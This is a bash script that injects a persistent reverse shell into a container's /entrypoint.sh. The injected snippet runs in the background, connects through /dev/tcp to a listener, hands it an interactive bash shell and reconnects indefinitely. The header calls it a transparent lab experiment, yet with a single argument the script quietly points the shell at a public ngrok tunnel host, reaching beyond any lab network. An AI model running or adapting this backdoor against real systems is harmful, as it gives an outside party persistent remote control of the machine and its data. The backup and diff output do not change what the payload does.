#!/bin/bash
# ==============================================================================
# inject-reverse-shell.sh
# Injects a non-blocking reverse shell call into /entrypoint.sh.
#
# Lab experiment  this script is intentionally TRANSPARENT and VERBOSE.
# It does NOT contain any behaviour for trace removal or for operating silently.
# ==============================================================================
#
# USAGE
#   chmod +x inject-reverse-shell.sh
#   ./inject-reverse-shell.sh <LISTENER_IP> <LISTENER_PORT>
#
# EXAMPLE
#   ./inject-reverse-shell.sh 10.0.0.42 4444
#
# WHAT THIS SCRIPT DOES
#   1. Backs up /entrypoint.sh to /entrypoint.sh.bak.YYYYMMDD-HHMMSS
#   2. Inserts a non-blocking reverse shell call early in /entrypoint.sh
#      (right after the shebang + set -e, before the main payload)
#   3. The injected snippet runs in a background subshell so it does not
#      block the existing entrypoint logic
#   4. Shows a diff between the original and the modified file
# ==============================================================================

set -euo pipefail

# ---- Usage ------------------------------------------------------------------
usage() {
    echo "Usage: $(basename "$0") LISTENER_IP LISTENER_PORT"
    echo ""
    echo "  LISTENER_IP     IP or hostname of your netcat listener"
    echo "  LISTENER_PORT   port the listener is bound to"
    echo ""
    echo "Example:"
    echo "  $(basename "$0") 10.0.0.42 4444"
    exit 1
}

if [ $# -eq 1 ]; then
    LISTENER_IP="0.tcp.ap.ngrok.io"
    LISTENER_PORT="$1"
elif [ $# -lt 2 ]; then
    usage
else
    LISTENER_IP="$1"
    LISTENER_PORT="$2"
fi

ENTRYPOINT="/entrypoint.sh"

if [ ! -f "$ENTRYPOINT" ]; then
    echo "[FATAL] ${ENTRYPOINT} does not exist."
    exit 1
fi

if [ ! -w "$ENTRYPOINT" ]; then
    echo "[FATAL] ${ENTRYPOINT} is not writable."
    exit 1
fi

echo ""
echo "============================================"
echo " Inject Reverse Shell  $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "============================================"
echo ""
echo "  Target file : ${ENTRYPOINT}"
echo "  Listener    : ${LISTENER_IP}:${LISTENER_PORT}"
echo "  Host        : $(uname -a)"
echo "  User        : $(id)"
echo ""

# ---- Validate IP -----------------------------------------------------------
if ! echo "$LISTENER_IP" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
    echo "[WARNING] '${LISTENER_IP}' doesn't look like an IPv4 address."
fi

# ---- Backup the original ---------------------------------------------------
BACKUP="${ENTRYPOINT}.bak.$(date +'%Y%m%d-%H%M%S')"
cp "$ENTRYPOINT" "$BACKUP"
echo "[*] Original backed up to: ${BACKUP}"

# ---- Build the injection payload -------------------------------------------
#
# The payload:
#   - Runs in a background subshell (  ) &   so it's non-blocking
#   - Sleeps briefly to let the container/service settle
#   - Loops forever, reconnecting after each disconnect with exponential
#     backoff (1s ? 2s ? 4s ?  ? 60s)
#   - Uses only bash's built-in /dev/tcp  no external dependencies
#
# Inserted after shebang + set -e, before anything else runs.
#

INJECTION=$(cat <<'INJECT_EOF'
# ---- injected reverse shell ----
(
    LHOST="__LISTENER_IP__"
    LPORT="__LISTENER_PORT__"
    sleep 3

    BACKOFF=1
    MAX_BACKOFF=60
    while true; do
        if exec 3<>/dev/tcp/"${LHOST}"/"${LPORT}" 2>/dev/null; then
            /bin/bash -i <&3 >&3 2>&3
            exec 3>&-
        fi
        sleep "${BACKOFF}"
        if [ "${BACKOFF}" -lt "${MAX_BACKOFF}" ]; then
            BACKOFF=$((BACKOFF * 2))
        fi
    done
) &
# ---- end injected reverse shell ----

INJECT_EOF
)

# Substitute the listener address into the payload
INJECTION="${INJECTION//__LISTENER_IP__/${LISTENER_IP}}"
INJECTION="${INJECTION//__LISTENER_PORT__/${LISTENER_PORT}}"

# ---- Perform the injection -------------------------------------------------
#
# Insert right after the "set -e" line (or shebang if no set -e).
#

echo "[*] Injecting reverse shell payload into ${ENTRYPOINT}..."

INSERT_AFTER="set -e"
FOUND=$(grep -n "^${INSERT_AFTER}\$" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)

if [ -z "$FOUND" ]; then
    INSERT_AFTER='#!/bin/bash'
    FOUND=$(grep -n "^${INSERT_AFTER}" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)
fi

if [ -z "$FOUND" ]; then
    echo "[FATAL] Cannot find a 'set -e' line or shebang in ${ENTRYPOINT}."
    exit 1
fi

echo "[*] Inserting after line ${FOUND}: ${INSERT_AFTER}"

head -n "$FOUND" "$ENTRYPOINT" > "${ENTRYPOINT}.new"
echo "$INJECTION" >> "${ENTRYPOINT}.new"
tail -n +$((FOUND + 1)) "$ENTRYPOINT" >> "${ENTRYPOINT}.new"

mv "${ENTRYPOINT}.new" "$ENTRYPOINT"
chmod --reference="$BACKUP" "$ENTRYPOINT"

echo "[*] Injection complete."
echo ""

# ---- Show diff -------------------------------------------------------------
echo "============================================"
echo "  DIFF  original vs injected"
echo "============================================"
diff "$BACKUP" "$ENTRYPOINT" || true
echo "============================================"
echo ""
echo "  Original : ${BACKUP}"
echo "  Injected : ${ENTRYPOINT}"
echo ""
echo "  To revert: cp ${BACKUP} ${ENTRYPOINT}"
echo ""
echo "  The injected shell connects to ${LISTENER_IP}:${LISTENER_PORT}"
echo "  and keeps reconnecting every 1s60s if the listener drops."
echo "============================================"
